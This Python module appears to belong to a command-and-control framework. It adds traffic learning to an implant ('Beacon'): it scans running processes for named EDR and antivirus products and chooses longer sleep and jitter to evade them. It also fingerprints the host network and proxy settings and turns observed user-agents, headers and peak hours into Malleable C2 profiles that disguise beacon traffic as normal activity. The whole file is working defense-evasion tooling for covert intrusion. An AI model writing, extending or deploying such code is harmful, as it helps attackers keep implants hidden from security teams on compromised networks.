"""
Traffic Learner Module - Traffic learning and adaptive profile generation.

This module enables Beacons to learn real network traffic patterns in the target
environment and automatically generate profiles that match the observed traffic.
Learned profiles are sent back to the C2 server for operator review and activation.

Core capabilities:
    1. Real-time traffic capture and analysis on the Beacon host
    2. User-Agent/Header/request pattern extraction
    3. Automatic profile generation from learned traffic patterns
    4. Network environment detection (domain/cloud/home network)
    5. EDR/AV process detection and adaptive profile switching

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import logging
import os
import platform
import random
import re
import time
from collections import Counter
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class NetworkEnvironment(str, Enum):
    """Detected network environment types."""

    DOMAIN_ENTERPRISE = "domain_enterprise"
    CLOUD = "cloud"
    HOME = "home"
    PUBLIC_WIFI = "public_wifi"
    UNKNOWN = "unknown"


class EDRType(str, Enum):
    """Known EDR/AV product types."""

    CROWDSTRIKE = "crowdstrike"
    SENTINELONE = "sentinelone"
    CARBON_BLACK = "carbon_black"
    DEFENDER_ATP = "defender_atp"
    SYMANTEC = "symantec"
    MCAFEE = "mcafee"
    SOPHOS = "sophos"
    FIREEYE = "fireeye"
    NONE = "none"


class TrafficProtocol(str, Enum):
    """Observed traffic protocol types."""

    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    WEBSOCKET = "websocket"
    UNKNOWN = "unknown"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class ObservedRequest:
    """A single observed HTTP request in the target network.

    Attributes:
        url: Full request URL
        method: HTTP method
        headers: Request headers
        user_agent: User-Agent string
        content_type: Content-Type header
        referer: Referer header
        timestamp: Observation timestamp
        response_status: Response status code
        response_size: Response body size
        protocol: Traffic protocol
    """

    url: str = ""
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    user_agent: str = ""
    content_type: str = ""
    referer: str = ""
    timestamp: float = 0.0
    response_status: int = 0
    response_size: int = 0
    protocol: TrafficProtocol = TrafficProtocol.UNKNOWN

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "url": self.url,
            "method": self.method,
            "user_agent": self.user_agent,
            "content_type": self.content_type,
            "referer": self.referer,
            "timestamp": self.timestamp,
            "response_status": self.response_status,
            "protocol": self.protocol.value,
        }


@dataclass
class TrafficPattern:
    """Aggregated traffic pattern from observed requests.

    Attributes:
        common_user_agents: Most frequently observed User-Agents
        common_headers: Most frequently observed headers
        common_methods: Most frequently observed HTTP methods
        common_domains: Most frequently accessed domains
        common_paths: Most frequently accessed URL paths
        common_content_types: Most common Content-Types
        average_request_interval: Average time between requests
        peak_hours: Hours with highest traffic volume
        request_count: Total number of observed requests
        observation_window: Duration of observation window
    """

    common_user_agents: List[Tuple[str, int]] = field(default_factory=list)
    common_headers: List[Tuple[str, str, int]] = field(default_factory=list)
    common_methods: List[Tuple[str, int]] = field(default_factory=list)
    common_domains: List[Tuple[str, int]] = field(default_factory=list)
    common_paths: List[Tuple[str, int]] = field(default_factory=list)
    common_content_types: List[Tuple[str, int]] = field(default_factory=list)
    average_request_interval: float = 0.0
    peak_hours: List[int] = field(default_factory=list)
    request_count: int = 0
    observation_window: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "common_user_agents": self.common_user_agents[:5],
            "common_methods": self.common_methods,
            "common_domains": self.common_domains[:10],
            "common_paths": self.common_paths[:10],
            "common_content_types": self.common_content_types[:5],
            "average_request_interval": round(self.average_request_interval, 2),
            "peak_hours": self.peak_hours,
            "request_count": self.request_count,
            "observation_window": round(self.observation_window, 2),
        }


@dataclass
class EDRDetectionResult:
    """Result of EDR/AV detection on the host.

    Attributes:
        detected_edr: Detected EDR type
        detected_processes: List of detected security processes
        confidence: Detection confidence (0.0-1.0)
        recommended_sleep: Recommended sleep time based on EDR
        recommended_jitter: Recommended jitter based on EDR
    """

    detected_edr: EDRType = EDRType.NONE
    detected_processes: List[str] = field(default_factory=list)
    confidence: float = 0.0
    recommended_sleep: int = 60
    recommended_jitter: int = 20


@dataclass
class LearnedProfile:
    """A profile learned from observed traffic patterns.

    Attributes:
        name: Profile identifier
        source: Source of the learning data
        network_environment: Detected network environment
        traffic_pattern: Aggregated traffic pattern
        edr_detection: EDR detection result
        generated_yaml: Generated YAML profile content
        confidence_score: How well the profile matches observed traffic
        created_at: Profile creation timestamp
        status: Profile review status
    """

    name: str = ""
    source: str = "traffic_learning"
    network_environment: NetworkEnvironment = NetworkEnvironment.UNKNOWN
    traffic_pattern: TrafficPattern = field(default_factory=TrafficPattern)
    edr_detection: EDRDetectionResult = field(default_factory=EDRDetectionResult)
    generated_yaml: str = ""
    confidence_score: float = 0.0
    created_at: str = ""
    status: str = "pending_review"

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "name": self.name,
            "source": self.source,
            "network_environment": self.network_environment.value,
            "traffic_pattern": self.traffic_pattern.to_dict(),
            "edr_detection": {
                "detected_edr": self.edr_detection.detected_edr.value,
                "confidence": self.edr_detection.confidence,
            },
            "confidence_score": round(self.confidence_score, 2),
            "created_at": self.created_at,
            "status": self.status,
        }


# =============================================================================
# EDR/AV Detector
# =============================================================================

class EDRDetector:
    """Detects EDR/AV products running on the host system.

    Scans running processes to identify security products and
    recommends appropriate stealth profiles.

    Attributes:
        _edr_signatures: Known EDR process name signatures
    """

    EDR_SIGNATURES: Dict[str, EDRType] = {
        "csfalcon": EDRType.CROWDSTRIKE,
        "csagent": EDRType.CROWDSTRIKE,
        "sentina": EDRType.SENTINELONE,
        "sentinelclient": EDRType.SENTINELONE,
        "cb": EDRType.CARBON_BLACK,
        "carbonblack": EDRType.CARBON_BLACK,
        "msmpeng": EDRType.DEFENDER_ATP,
        "sensec": EDRType.DEFENDER_ATP,
        "sep": EDRType.SYMANTEC,
        "symantec": EDRType.SYMANTEC,
        "mcafee": EDRType.MCAFEE,
        "vsstat": EDRType.MCAFEE,
        "sophos": EDRType.SOPHOS,
        "savservice": EDRType.SOPHOS,
        "xagt": EDRType.FIREEYE,
        "fireeye": EDRType.FIREEYE,
    }

    def detect(self) -> EDRDetectionResult:
        """Detect EDR/AV products on the current host.

        Returns:
            EDRDetectionResult with detection findings and recommendations.
        """
        result = EDRDetectionResult()
        processes = self._get_running_processes()

        detected_types: Dict[EDRType, List[str]] = {}

        for proc in processes:
            proc_lower = proc.lower()
            for signature, edr_type in self.EDR_SIGNATURES.items():
                if signature in proc_lower:
                    if edr_type not in detected_types:
                        detected_types[edr_type] = []
                    detected_types[edr_type].append(proc)
                    result.detected_processes.append(proc)

        if detected_types:
            result.detected_edr = max(
                detected_types.keys(),
                key=lambda k: len(detected_types[k]),
            )
            result.confidence = min(
                len(result.detected_processes) * 0.3, 1.0,
            )
            result.recommended_sleep = self._get_recommended_sleep(
                result.detected_edr,
            )
            result.recommended_jitter = self._get_recommended_jitter(
                result.detected_edr,
            )

            logger.info(
                f"EDR detected: {result.detected_edr.value} "
                f"({len(result.detected_processes)} processes)"
            )
        else:
            logger.info("No known EDR/AV products detected")

        return result

    def _get_running_processes(self) -> List[str]:
        """Get list of running process names.

        Returns:
            List of process name strings.
        """
        processes: List[str] = []

        try:
            if platform.system() == "Windows":
                import subprocess
                output = subprocess.check_output(
                    ["tasklist", "/FO", "CSV", "/NH"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                ).decode("gbk", errors="ignore")
                for line in output.strip().split("\n"):
                    parts = line.split(",")
                    if parts:
                        name = parts[0].strip('"')
                        processes.append(name)

            elif platform.system() == "Linux":
                for pid_dir in os.listdir("/proc"):
                    if pid_dir.isdigit():
                        try:
                            with open(f"/proc/{pid_dir}/comm") as f:
                                processes.append(f.read().strip())
                        except (FileNotFoundError, PermissionError):
                            pass

            elif platform.system() == "Darwin":
                import subprocess
                output = subprocess.check_output(["ps", "-eo", "comm"]).decode()
                for line in output.strip().split("\n")[1:]:
                    processes.append(line.strip())

        except Exception as e:
            logger.warning(f"Failed to enumerate processes: {e}")

        return processes

    def _get_recommended_sleep(self, edr_type: EDRType) -> int:
        """Get recommended sleep time for a detected EDR.

        Args:
            edr_type: Detected EDR type.

        Returns:
            Recommended sleep time in seconds.
        """
        recommendations: Dict[EDRType, int] = {
            EDRType.CROWDSTRIKE: 300,
            EDRType.SENTINELONE: 240,
            EDRType.CARBON_BLACK: 180,
            EDRType.DEFENDER_ATP: 120,
            EDRType.SYMANTEC: 180,
            EDRType.MCAFEE: 150,
            EDRType.SOPHOS: 180,
            EDRType.FIREEYE: 240,
        }
        return recommendations.get(edr_type, 60)

    def _get_recommended_jitter(self, edr_type: EDRType) -> int:
        """Get recommended jitter percentage for a detected EDR.

        Args:
            edr_type: Detected EDR type.

        Returns:
            Recommended jitter percentage.
        """
        recommendations: Dict[EDRType, int] = {
            EDRType.CROWDSTRIKE: 50,
            EDRType.SENTINELONE: 45,
            EDRType.CARBON_BLACK: 40,
            EDRType.DEFENDER_ATP: 35,
            EDRType.SYMANTEC: 40,
            EDRType.MCAFEE: 35,
            EDRType.SOPHOS: 40,
            EDRType.FIREEYE: 45,
        }
        return recommendations.get(edr_type, 20)


# =============================================================================
# Network Environment Detector
# =============================================================================

class NetworkEnvironmentDetector:
    """Detects the type of network environment the host is in.

    Analyzes DNS suffixes, domain membership, and network characteristics
    to determine if the host is in an enterprise, cloud, or home network.

    Attributes:
        _cloud_indicators: Known cloud provider DNS suffixes
        _enterprise_indicators: Known enterprise network indicators
    """

    CLOUD_INDICATORS = [
        "compute.internal",
        "cloud.internal",
        "amazonaws.com",
        "azure.com",
        "cloudapp.azure.com",
        "google.internal",
        "oraclevcn.com",
    ]

    ENTERPRISE_INDICATORS = [
        "corp",
        "internal",
        "local",
        "ad",
        "company",
        "enterprise",
    ]

    def detect(self) -> NetworkEnvironment:
        """Detect the current network environment type.

        Returns:
            Detected NetworkEnvironment type.
        """
        dns_suffixes = self._get_dns_suffixes()
        hostname = platform.node().lower()

        cloud_score = sum(
            1 for indicator in self.CLOUD_INDICATORS
            if any(indicator in suffix for suffix in dns_suffixes)
        )

        enterprise_score = sum(
            1 for indicator in self.ENTERPRISE_INDICATORS
            if any(indicator in suffix for suffix in dns_suffixes)
        )

        if ".local" in hostname or ".corp" in hostname:
            enterprise_score += 2

        if cloud_score > 0:
            return NetworkEnvironment.CLOUD
        elif enterprise_score >= 2:
            return NetworkEnvironment.DOMAIN_ENTERPRISE
        elif enterprise_score == 1:
            return NetworkEnvironment.HOME
        else:
            return NetworkEnvironment.UNKNOWN

    def _get_dns_suffixes(self) -> List[str]:
        """Get DNS search suffixes from the system configuration.

        Returns:
            List of DNS suffix strings.
        """
        suffixes: List[str] = []

        try:
            if platform.system() == "Windows":
                import subprocess
                output = subprocess.check_output(
                    ["ipconfig", "/all"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                ).decode("gbk", errors="ignore")
                for line in output.split("\n"):
                    if "DNS Suffix" in line or "Domain" in line:
                        parts = line.split(":")
                        if len(parts) > 1:
                            suffix = parts[-1].strip()
                            if suffix:
                                suffixes.append(suffix.lower())

            elif platform.system() in ("Linux", "Darwin"):
                for conf_file in ["/etc/resolv.conf", "/etc/hosts"]:
                    if os.path.exists(conf_file):
                        with open(conf_file) as f:
                            for line in f:
                                if line.startswith("search") or line.startswith("domain"):
                                    parts = line.split()
                                    suffixes.extend(p.lower() for p in parts[1:])

        except Exception as e:
            logger.warning(f"Failed to detect DNS suffixes: {e}")

        return suffixes

    def detect_proxy(self) -> Optional[str]:
        """Detect if an HTTP proxy is configured.

        Returns:
            Proxy URL if detected, None otherwise.
        """
        proxy = os.environ.get("HTTP_PROXY") or os.environ.get("http_proxy")
        if proxy:
            return proxy

        if platform.system() == "Windows":
            try:
                import subprocess
                output = subprocess.check_output(
                    ["reg", "query",
                     "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
                     "/v", "ProxyServer"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                ).decode()
                for line in output.split("\n"):
                    if "ProxyServer" in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            return parts[2]
            except Exception:
                pass

        return None


# =============================================================================
# Traffic Pattern Analyzer
# =============================================================================

class TrafficPatternAnalyzer:
    """Analyzes observed traffic to extract patterns and statistics.

    Processes captured HTTP requests to identify common User-Agents,
    headers, domains, and timing patterns.

    Attributes:
        _observations: List of observed requests
        _observation_start: Start of observation window
    """

    def __init__(self) -> None:
        """Initialize the TrafficPatternAnalyzer."""
        self._observations: List[ObservedRequest] = []
        self._observation_start = time.time()

    def add_observation(self, request: ObservedRequest) -> None:
        """Add an observed request to the analysis pool.

        Args:
            request: ObservedRequest to analyze.
        """
        request.timestamp = request.timestamp or time.time()
        self._observations.append(request)

    def add_observations(self, requests: List[ObservedRequest]) -> None:
        """Add multiple observed requests.

        Args:
            requests: List of ObservedRequest instances.
        """
        for req in requests:
            self.add_observation(req)

    def analyze(self) -> TrafficPattern:
        """Analyze all observed requests and extract patterns.

        Returns:
            TrafficPattern with aggregated statistics.
        """
        if not self._observations:
            return TrafficPattern()

        pattern = TrafficPattern()
        pattern.request_count = len(self._observations)
        pattern.observation_window = time.time() - self._observation_start

        ua_counter: Counter[str] = Counter()
        method_counter: Counter[str] = Counter()
        domain_counter: Counter[str] = Counter()
        path_counter: Counter[str] = Counter()
        content_type_counter: Counter[str] = Counter()
        header_counter: Counter[Tuple[str, str]] = Counter()
        hour_counter: Counter[int] = Counter()

        for obs in self._observations:
            if obs.user_agent:
                ua_counter[obs.user_agent] += 1
            method_counter[obs.method] += 1

            if obs.url:
                try:
                    from urllib.parse import urlparse
                    parsed = urlparse(obs.url)
                    if parsed.hostname:
                        domain_counter[parsed.hostname] += 1
                    if parsed.path:
                        path_counter[parsed.path] += 1
                except Exception:
                    pass

            if obs.content_type:
                content_type_counter[obs.content_type] += 1

            for key, value in obs.headers.items():
                header_counter[(key, value)] += 1

            if obs.timestamp > 0:
                from datetime import datetime
                hour_counter[datetime.fromtimestamp(obs.timestamp).hour] += 1

        pattern.common_user_agents = ua_counter.most_common(10)
        pattern.common_methods = method_counter.most_common()
        pattern.common_domains = domain_counter.most_common(10)
        pattern.common_paths = path_counter.most_common(10)
        pattern.common_content_types = content_type_counter.most_common(5)
        pattern.common_headers = [
            (k, v, c) for (k, v), c in header_counter.most_common(20)
        ]
        pattern.peak_hours = [
            hour for hour, _ in hour_counter.most_common(5)
        ]

        if len(self._observations) > 1:
            timestamps = sorted(o.timestamp for o in self._observations if o.timestamp > 0)
            if len(timestamps) > 1:
                intervals = [
                    timestamps[i + 1] - timestamps[i]
                    for i in range(len(timestamps) - 1)
                ]
                pattern.average_request_interval = sum(intervals) / len(intervals)

        return pattern


# =============================================================================
# Profile Generator from Learned Traffic
# =============================================================================

class LearnedProfileGenerator:
    """Generates Malleable C2 Profiles from learned traffic patterns.

    Takes a TrafficPattern and generates a YAML profile that matches
    the observed traffic characteristics.

    Attributes:
        _profile_counter: Counter for generating unique profile names
    """

    def __init__(self) -> None:
        """Initialize the LearnedProfileGenerator."""
        self._profile_counter = 0

    def generate(
        self,
        pattern: TrafficPattern,
        edr_result: Optional[EDRDetectionResult] = None,
        network_env: NetworkEnvironment = NetworkEnvironment.UNKNOWN,
    ) -> LearnedProfile:
        """Generate a profile from traffic patterns.

        Args:
            pattern: Analyzed traffic pattern.
            edr_result: EDR detection result (optional).
            network_env: Detected network environment.

        Returns:
            LearnedProfile with generated YAML content.
        """
        self._profile_counter += 1
        name = f"learned_{network_env.value}_{self._profile_counter}"

        user_agent = pattern.common_user_agents[0][0] if pattern.common_user_agents else ""
        method = pattern.common_methods[0][0] if pattern.common_methods else "GET"
        domain = pattern.common_domains[0][0] if pattern.common_domains else "example.com"
        path = pattern.common_paths[0][0] if pattern.common_paths else "/"
        content_type = pattern.common_content_types[0][0] if pattern.common_content_types else ""

        sleep_time = edr_result.recommended_sleep if edr_result else 60
        jitter = edr_result.recommended_jitter if edr_result else 20

        headers_yaml = self._format_headers(pattern.common_headers)

        yaml_content = (
            f"# Auto-generated profile from traffic learning\n"
            f"# Network environment: {network_env.value}\n"
            f"# Confidence: {self._compute_confidence(pattern):.0%}\n\n"
            f"name: {name}\n"
            f'version: "1.0.0"\n'
            f'author: "Kunlun Traffic Learner"\n'
            f'description: "Auto-generated from observed traffic in {network_env.value} environment"\n'
            f"protocols:\n"
            f"  - https\n\n"
            f"http:\n"
            f"  http_method: {method}\n"
            f'  http_uri: "{path}?ts={{{{timestamp}}}}&id={{{{random_string}}}}"\n'
            f"  user_agent:\n"
            f'    - "{user_agent}"\n'
            f"  headers:\n"
            f"{headers_yaml}"
            f'  referer: "https://{domain}/"\n'
            f"  body_format: {self._infer_body_format(content_type)}\n\n"
            f"heartbeat:\n"
            f"  sleep_time: {sleep_time}\n"
            f"  jitter: {jitter}\n"
            f"  max_retry: 5\n"
            f"  work_hours_start: {pattern.peak_hours[0] if pattern.peak_hours else 9}\n"
            f"  work_hours_end: {pattern.peak_hours[-1] if pattern.peak_hours else 18}\n"
            f"  work_hours_multiplier: 0.5\n\n"
            f"encryption:\n"
            f"  encryption: aes-256-gcm\n"
            f"  encoding: base64\n"
            f'  key: ""\n'
        )

        return LearnedProfile(
            name=name,
            network_environment=network_env,
            traffic_pattern=pattern,
            edr_detection=edr_result or EDRDetectionResult(),
            generated_yaml=yaml_content,
            confidence_score=self._compute_confidence(pattern),
            created_at=time.strftime("%Y-%m-%dT%H:%M:%S"),
            status="pending_review",
        )

    def _format_headers(self, headers: List[Tuple[str, str, int]]) -> str:
        """Format common headers as YAML.

        Args:
            headers: List of (key, value, count) tuples.

        Returns:
            YAML-formatted headers string.
        """
        seen_keys: set[str] = set()
        lines = []

        for key, value, count in headers:
            if key.lower() in ("host", "content-length", "cookie"):
                continue
            if key.lower() not in seen_keys:
                seen_keys.add(key.lower())
                lines.append(f"    {key}: \"{value}\"")

        if not lines:
            lines.append('    Accept: "*/*"')

        return "\n".join(lines) + "\n"

    def _infer_body_format(self, content_type: str) -> str:
        """Infer body format from Content-Type.

        Args:
            content_type: Content-Type string.

        Returns:
            Body format string for YAML.
        """
        if "json" in content_type:
            return "json"
        elif "xml" in content_type:
            return "xml"
        elif "form" in content_type:
            return "form"
        return "plain"

    def _compute_confidence(self, pattern: TrafficPattern) -> float:
        """Compute confidence score for a learned profile.

        Args:
            pattern: Traffic pattern to score.

        Returns:
            Confidence score (0.0-1.0).
        """
        score = 0.0

        if pattern.request_count >= 100:
            score += 0.3
        elif pattern.request_count >= 50:
            score += 0.2
        elif pattern.request_count >= 10:
            score += 0.1

        if pattern.common_user_agents:
            score += 0.2

        if pattern.common_domains:
            score += 0.2

        if pattern.common_headers:
            score += 0.15

        if pattern.average_request_interval > 0:
            score += 0.15

        return min(score, 1.0)


# =============================================================================
# Traffic Learner (Main Class)
# =============================================================================

class TrafficLearner:
    """Main traffic learning engine that coordinates all sub-components.

    Integrates EDR detection, network environment detection, traffic
    pattern analysis, and profile generation to create adaptive profiles.

    Attributes:
        _edr_detector: EDR/AV detector instance
        _network_detector: Network environment detector
        _pattern_analyzer: Traffic pattern analyzer
        _profile_generator: Learned profile generator
        _learned_profiles: List of generated profiles
        _is_monitoring: Whether active monitoring is running
    """

    def __init__(self) -> None:
        """Initialize the TrafficLearner."""
        self._edr_detector = EDRDetector()
        self._network_detector = NetworkEnvironmentDetector()
        self._pattern_analyzer = TrafficPatternAnalyzer()
        self._profile_generator = LearnedProfileGenerator()
        self._learned_profiles: List[LearnedProfile] = []
        self._is_monitoring = False

    def detect_environment(self) -> Dict[str, Any]:
        """Detect the current host and network environment.

        Returns:
            Dictionary with EDR, network, and proxy detection results.
        """
        edr_result = self._edr_detector.detect()
        network_env = self._network_detector.detect()
        proxy = self._network_detector.detect_proxy()

        return {
            "edr": {
                "type": edr_result.detected_edr.value,
                "confidence": edr_result.confidence,
                "processes": edr_result.detected_processes,
                "recommended_sleep": edr_result.recommended_sleep,
                "recommended_jitter": edr_result.recommended_jitter,
            },
            "network": {
                "environment": network_env.value,
                "proxy": proxy,
            },
        }

    def add_observed_request(self, request: ObservedRequest) -> None:
        """Add an observed request for analysis.

        Args:
            request: ObservedRequest to analyze.
        """
        self._pattern_analyzer.add_observation(request)

    def add_observed_requests(self, requests: List[ObservedRequest]) -> None:
        """Add multiple observed requests.

        Args:
            requests: List of ObservedRequest instances.
        """
        self._pattern_analyzer.add_observations(requests)

    def generate_profile(self) -> Optional[LearnedProfile]:
        """Generate a profile from all observed traffic.

        Returns:
            LearnedProfile with generated YAML, or None if insufficient data.
        """
        edr_result = self._edr_detector.detect()
        network_env = self._network_detector.detect()
        pattern = self._pattern_analyzer.analyze()

        if pattern.request_count < 5:
            logger.warning(
                f"Insufficient traffic data for profile generation "
                f"({pattern.request_count} observations, need >= 5)"
            )
            return None

        profile = self._profile_generator.generate(pattern, edr_result, network_env)
        self._learned_profiles.append(profile)

        logger.info(
            f"Generated learned profile: {profile.name} "
            f"(confidence: {profile.confidence_score:.0%})"
        )

        return profile

    def get_learned_profiles(self) -> List[LearnedProfile]:
        """Get all generated learned profiles.

        Returns:
            List of LearnedProfile instances.
        """
        return list(self._learned_profiles)

    def get_observation_count(self) -> int:
        """Get the number of observed requests.

        Returns:
            Total observation count.
        """
        return self._pattern_analyzer._observations.__len__()


# =============================================================================
# Global Singleton
# =============================================================================

_traffic_learner: Optional[TrafficLearner] = None


def get_traffic_learner() -> TrafficLearner:
    """Get the global TrafficLearner singleton.

    Returns:
        Singleton TrafficLearner instance.
    """
    global _traffic_learner
    if _traffic_learner is None:
        _traffic_learner = TrafficLearner()
    return _traffic_learner


__all__ = [
    "TrafficLearner",
    "EDRDetector",
    "NetworkEnvironmentDetector",
    "TrafficPatternAnalyzer",
    "LearnedProfileGenerator",
    "ObservedRequest",
    "TrafficPattern",
    "EDRDetectionResult",
    "LearnedProfile",
    "NetworkEnvironment",
    "EDRType",
    "TrafficProtocol",
    "get_traffic_learner",
]
